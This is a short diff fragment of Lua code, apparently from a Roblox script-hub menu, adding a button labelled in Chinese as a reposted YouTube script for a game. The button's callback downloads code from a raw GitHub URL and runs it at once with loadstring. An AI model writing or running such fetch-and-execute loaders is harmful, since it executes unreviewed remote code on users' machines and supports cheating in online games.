+Tab:AddButton({
+  Name = "被遗弃油管搬运脚本",
+  Callback = function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/SkibidiCen/MainMenu/main/Code"))()
+    end
+})
